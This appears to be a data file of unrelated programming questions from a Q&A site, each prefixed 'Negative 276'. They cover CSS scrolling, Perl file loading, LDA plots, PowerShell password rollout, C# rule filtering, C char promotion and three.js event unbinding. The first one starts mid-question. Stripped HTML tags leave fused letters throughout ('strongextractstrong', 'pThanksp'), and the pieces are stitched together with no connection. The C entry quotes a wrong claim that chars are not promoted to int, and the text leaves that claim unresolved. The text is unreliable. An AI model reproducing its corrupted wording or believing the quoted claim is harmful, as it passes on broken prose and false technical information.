To the right of that div there will be content a dynamically adjustable amount of content. Now, I want that image displayed as content in the GIF to be centered inside the DIV. As I scroll, I want the div to become smaller which should look just like regular scrolling, except the div is not actually moving out of the viewport. At around 400px it should then stop shrinking, showing just a part of the images center.br So  image 1 of the GIF is the way it usually is. And image 2 of the GIF is the way I want it to happen. This should of course work responsively.

Negative 276 pMy question is all about tips and tricks. Im currently working on project, where I have one very big1Gb file with data. First, I need to strongextractstrong data. This extraction takes 10 mins. Then I do strongcalculationsstrong. Next calculation depends on previous. Lets call them calculation1, calculation2 and so on. Assuming, that Ive done extraction part right, I currently face two problemsp  ol liEvery time I launch program it works 10 mins least. I cannot avoid it, so I have to plan debugging.li liFor every next calculation it takes more time.li ol  pThinking of first problem, I assumed, that some sort of database may help, if database is faster, than reading file, which I doubt.p  pSecond problem might be overcomed if I split my big program in smaller programs, each of which will do emread filedo stuffwrite fileem. So next stage always can read file from previous, for debug. But it introduces many wasted code for file IO.p  pI think that both these problems could be solved by some strategy like write, and test extract module, than launch it and let it extract all data into RAM. Than write calculation1, and launch it to somehow stronggrab data directlystrong from RAM of extract module. And so on with every next calculation. So my questions arep  ol liAre there tips and tricks to minimize loads from filesli liAre there ways to share RAM and objects between programsli ol  pBy the way I write this task on Perl because I need it quick, but Ill  rewrite it on C or C later, so any languagespecific or languageagnostic answers welcome.p  pThank youp  p[EDIT]p  pFile of data does not change it is like big immutable source of knowledge. And it is not exactly 1Gb and it does not take 10 minutes to read it. I just wanted to say, that file is big and time to read it is considerable. On my machine 1 Gb readparse file into right objects takes about minute. Which is still pretty bad.p  p[EDIT]p

Negative 276 pI have used a linear discriminant analysis LDA to investigate how well a set of variables discriminates between 3 groups. I then used the codeplot.ldacode function to plot my data on the two linear discriminants LD1 on the xaxis and LD2 on the yaxis.

The codepartimatcode function allows visualisation of the LD classification borders, but variables are used as the x and y axes in this case, rather than the linear discriminants.

Negative 276 pIm currently working on a PowerShell module that dynamically assigns a unique local admin password to each machine on the network based on a specific naming convention. Ive got that script working well, but obviously, if one of the computers the script is accessing isnt turned on or is disconnected from the network, I just get the Could not connect to RPC server error message. Now, if I were to push out these password changes via group policy, even if the computer wasnt connected to the network, once it did check in, the change would be implemented. I can think of a couple of ways to mimic this behavior in PowerShell, such as setting it as a scheduled task, rerunning the script only against computers that werent reached the previous run, but I was wondering if anyone knew of any best practices for carrying out this kind of operationp  pThanksp

Negative 276 pI made a configurator in C, the program show differents winforms according to each step. p  pImagine a form with three options, you can choose Door, Window and also Car or Bycicle. Door and Window is in the same group with radio button control, the user choose one or other but he cant choose both. Car and bycicle are checkboxes, he can choose both.p  pOk, my idea now is that the user can configure his own rules for his configurators, the idea its that he can add rules for add materials depending the options he will choose in the form of the configurator.p  pFor examplep  blockquote   pRule 1 If i choose window, i put 2 glassesp      pRule 2 If i choose a bycicle, i put two wheels p      pRule 3 If i choose a car, i put 4 wheelsand 6 glasses.p blockquote  pThe rules will be created using a form with some checkboxes that he can mark, for examplep  pLine 1 p  blockquote   pWindow checkbox      Bycicle checkbox      Car checkbox         Materials to addtextbox   Uds to add numericupdownp blockquote  pThe problem here is when i try to filter his choice. He can create a rule for window and car where he can put 1 glass. He can create a rule for car and bycicle where he can put 2 wheels. Also he can create another rule for only windows, only bycicle or only car...p  pMy problem is  how i can filter his options i tried withp  precodeifwindowFORM.checked  windowCARTRULE      bycicleFORM.checked  bycicleCARTRULE.checked      carFORM.checked  carCARTRULE.checked        add material  codepre  pBut didnt work.

Negative 276 pI made a statement to a colleague of mine, which wasp  blockquote   pchars are automatically promoted to integers in C expressions, and thats fine for performance since CPUs work fastest with their natural word size.p blockquote  pI believe char promotion behavior is stated somewhere in the standard due to a chars rank.p  pThis is the response I got back  p  blockquote   pCharacters are not default promoted to an integer. The register size   is 32 bit, but multiple byte values in a row can be packed into a   single register as a compiler implementation. This is not always   predictive. The only time you can verify automatic promotion is when   the type is passed into the call stack when not wrapped around a   structure because C standard officially needs 32bit values in the   call stack memory. A great deal of CPU architectures have optimized   assembly calls for non32 bit values, so no assumptions can be made   about the CPU or compiler in this case.p blockquote  pIm not sure who is right, and what to believe.

Negative 276 pWhen I try to unbind events of objectswith threex.domevents  that have been removed a lot of times and then show them again with some changesshape changes, but the same events, sometimes normally at the second or third try it rises an assertion failed error and the code is no longer working...p  pI got something like thisp  precodedomEvents.bindcube, click, functionobject3d      redraw1cube.info.month   domEvents.bindcube, mouseover, functionobject3d      changeMeshColorcube     showInfocube   domEvents.bindcube, mouseout, functionobject3d      cube.material.color.setHexcube.origincolor  codepre  pand when I need to redraw the cubes with the same code, I remove the previous cubes and their propierties, and then unbind their events with thisp  precodefor var i  0 i lt sceneobjects1.length i      domEvents.unbindsceneobjects1[i], click, functionobject3d          redraw2sceneobjects1[i].info.org           domEvents.unbindsceneobjects1[i], mouseover, functionobject3d          changeMeshColorsceneobjects1[i]         showInfosceneobjects1[i]           domEvents.unbindsceneobjects1[i], mouseout, functionobject3d          sceneobjects1[i].material.color.setHexsceneobjects1[i].origincolor          scene.removesceneobjects1[i] codepre  pwhere codesceneobjects1code contains the previous cubes.

Negative 276 pI wanted to make an image and I figured this was the quickest way.  The idea is that there are rows with lines 5 pixels high, and every new row, the amount of pixels in between the lines are 1 pixel more than the previous row.
